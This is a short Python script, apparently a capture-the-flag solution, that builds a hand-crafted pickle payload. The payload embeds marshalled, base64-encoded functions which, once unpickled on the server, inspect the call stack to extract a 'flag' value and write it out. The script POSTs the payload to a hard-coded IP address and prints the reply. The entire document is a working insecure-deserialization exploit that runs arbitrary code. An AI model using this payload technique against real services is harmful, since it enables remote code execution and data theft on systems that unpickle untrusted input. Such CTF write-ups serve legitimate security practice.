import base64
import marshal
import requests


def fun1(frames):
    return frames[3][0]


def fun2(frames_data):
    return frames_data[-6][1]['flag'].flag

code1 = base64.b64encode(marshal.dumps(fun1.func_code))
code2 = base64.b64encode(marshal.dumps(fun2.func_code))


class Flag(object):
    def __init__(self):
        self.flag = 'test'

flag = Flag()
data = "cos\nwrite\n(I1\nctypes\nFunctionType\n(cmarshal\nloads\n(cbase64\nb64decode\n(S'"+code2+"'\ntRtR(dS''\n))tR(cinspect\ngetmembers\n(ctypes\nFunctionType\n(cmarshal\nloads\n(cbase64\nb64decode\n(S'"+code1+"'\ntRtR(dS''\n(t(ttR(cinspect\ngetouterframes\n(cinspect\ncurrentframe\n)RtRtRtRtRtR."
url = "http://136.243.194.43/"
result = requests.post(url, data=data)
print(result.text)
# for local test
# res = pickle.loads(data)
# print('res: %r\n' % res)

